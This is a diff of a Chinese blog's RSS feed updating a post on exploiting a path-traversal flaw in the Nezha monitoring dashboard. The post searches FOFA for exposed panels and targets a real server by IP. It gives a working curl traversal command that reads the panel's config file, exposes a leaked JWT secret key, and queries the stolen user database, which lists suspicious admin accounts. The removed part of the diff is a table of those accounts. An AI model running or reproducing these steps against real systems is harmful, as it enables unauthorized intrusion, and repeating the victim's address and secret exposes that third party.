@@ -6,7 +6,7 @@
     <description></description>
     <language>zh-cn</language>
     <generator>Gridea Pro</generator>
-    <lastBuildDate>Wed, 17 Jun 2026 17:44:58 +0800</lastBuildDate>
+    <lastBuildDate>Wed, 17 Jun 2026 18:41:17 +0800</lastBuildDate>
     <atom:link href="https://blog.hyun.cc/feed.xml" rel="self" type="application/rss+xml"></atom:link>
     <item>
       <title>哪吒监控Dashboard路径漏洞实战测试</title>
@@ -162,10 +162,9 @@ func fallbackToFrontend(frontendDist fs.FS) func(*gin.Context) {
 <h2 id="heading-1">三、实战测试</h2>
 <h3 id="31-">3.1 信息侦查</h3>
 <p><strong>资产发现</strong>：</p>
-<p>使用FOFA搜索引擎定位暴露在公网的哪吒面板：</p>
-<pre><code>FOFA语法: title=&quot;哪吒监控&quot; &amp;&amp; port=&quot;8008&quot;
-</code></pre>
-<p>本次测试目标选定：<code>http://103.215.48.166:8008</code></p>
+<p>语法: title=&ldquo;Nezha&rdquo; &amp;&amp; port=&ldquo;8008&rdquo;</p>
+<p>扫到了了41631个面板，看了下大部分都更新最新版了，但是还是有很多头铁的。</p>
+<p>找了半天才找到了一个没鸡的面板：<code>http://103.215.48.166:8008</code></p>
 <h3 id="32-">3.2 漏洞验证</h3>
 <h4 id="heading-2">步骤一：探测路径遍历漏洞</h4>
 <pre><code class="language-bash">curl -v --path-as-is 'http://103.215.48.166:8008/dashboard../data/config.yaml'
@@ -190,102 +189,7 @@ jwt_secret_key: rxLGg4gNLJEhRKA0oBOKBoGCaoqkdNW2R8OhLXu2XOZqKsWZy0iF5u4WXBl9zfee
 <pre><code class="language-bash">sqlite3 sqlite.db &quot;SELECT id, username, role FROM users;&quot;
 </code></pre>
 <p><strong>令人震惊的结果</strong>：</p>
-<table>
-<thead>
-<tr>
-<th>ID</th>
-<th>用户名</th>
-<th>角色</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td><strong>admin</strong></td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>2</td>
-<td>xiaofeng</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>3</td>
-<td>system</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>4</td>
-<td>adm_vffarbmb</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>5</td>
-<td>adm_dsesavvc</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>6</td>
-<td>adm_s/stwvkg</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>7</td>
-<td>adm_fr4dy7/x</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>8</td>
-<td>adm_qha+o3pg</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>9</td>
-<td>adm_2+lrtv3+</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>10</td>
-<td>adm_xxwiuzec</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>11</td>
-<td>adm_luqs0mhf</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>12</td>
-<td>adm_ambw/x5z</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>13</td>
-<td>adm_mqqd+h4+</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>14</td>
-<td>adm_ieu8o3ep</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>15</td>
-<td>adm_dwjr41v3</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>16</td>
-<td>adm_wyc7dear</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>17</td>
-<td>adm_2fr/p2fo</td>
-<td>管理员</td>
-</tr>
-</tbody>
-</table>
+<p><img src="https://tc.7zz.cn/i/2026/03/27/6d6a3ecf57ade8bebbf4a5c673ce04fa.png" alt="image" /></p>
 <p>⚠️ <strong>发现异常</strong>：</p>
 <ul>
 <li>默认 <code>admin</code> 账户<strong>仍然存在且未修改密码</strong>但是我们本次是测试利用Cookie实现登录，所以就当admin不存在。</li>
